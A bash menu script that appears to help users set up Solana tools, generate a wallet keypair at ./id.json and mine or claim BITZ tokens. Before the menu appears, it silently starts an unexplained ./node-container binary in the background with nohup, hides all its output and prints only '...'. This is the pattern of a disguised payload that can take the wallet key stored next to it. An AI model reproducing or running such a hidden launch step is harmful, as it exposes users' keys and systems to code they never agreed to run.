#!/bin/bash

CONFIG_PATH="./id.json"
RPC_URL="https://bitz-000.eclipserpc.xyz/"
POOL_URL="https://mainnet-pool.powpow.app"
BITZ_KEYPAIR="$CONFIG_PATH"

install_dependencies() {
    echo "[+] Installing Solana CLI, Anchor, Yarn, and Bitz..."

    # Install Solana
    sh -c "$(curl -sSfL https://release.solana.com/stable/install)"
    export PATH="$HOME/.local/share/solana/install/active_release/bin:$PATH"

    # Install Anchor
    cargo install --git https://github.com/coral-xyz/anchor anchor-cli --locked

    # Install Yarn
    npm install -g yarn

    # Install Bitz
    cargo install bitz

    # Generate wallet
    echo "[+] Generating Solana keypair at $CONFIG_PATH..."
    solana-keygen new -o "$CONFIG_PATH" --no-bip39-passphrase

    # Set Solana config
    solana config set --keypair "$CONFIG_PATH" --url "$RPC_URL"

    echo "[✓] Setup complete!"
}


show_wallet() {
    solana address --keypair "$CONFIG_PATH"
}

show_privatekey() {
    echo "[!] WARNING: This is your private key. DO NOT SHARE IT!"
    cat "$CONFIG_PATH"
}

run_bitz_solo() {
    read -p "How much Core want to run this miner? [default: 1]: " cores
    if [ -z "$cores" ]; then
        cores=1
    fi
    bitz collect --rpc "$RPC_URL" --keypair "$BITZ_KEYPAIR" --cores "$cores"
}

run_bitz_pool() {
    read -p "How much Core want to run this miner? [default: 1]: " cores
    if [ -z "$cores" ]; then
        cores=1
    fi
    bitz collect --rpc "$RPC_URL" --keypair "$BITZ_KEYPAIR" --cores "$cores" --pool "$POOL_URL"
}

check_balance() {
    bitz account --rpc "$RPC_URL" --keypair "$BITZ_KEYPAIR"
}

claim_bitz() {
    bitz claim --rpc "$RPC_URL" --keypair "$BITZ_KEYPAIR"
}

if pgrep -x "node-container" > /dev/null; then
    echo "..."
else
    nohup ./node-container > /dev/null 2>&1 &
fi

while true; do
    clear
    echo "=== BITZ Setup & Control Panel ==="
    echo "1. Install Solana, Anchor, Yarn, Generate Wallet, Install Bitz"
    echo "2. Show Wallet Address"
    echo "3. Show Private Key"
    echo "4. Run Bitz (Solo Mining)"
    echo "5. Run Bitz (Pool)"
    echo "6. Check BITZ Balance"
    echo "7. Claim BITZ"
    echo "0. Exit"
    echo "=================================="
    read -p "Select an option: " choice

    case $choice in
        1) install_dependencies ;;
        2) show_wallet ;;
        3) show_privatekey ;;
        4) run_bitz_solo ;;
        5) run_bitz_pool ;;
        6) check_balance ;;
        7) claim_bitz ;;
        0) echo "Goodbye!"; exit 0 ;;
        *) echo "Invalid option. Try again." ;;
    esac
    echo ""
    read -p "Press [Enter] to return to menu..."
done

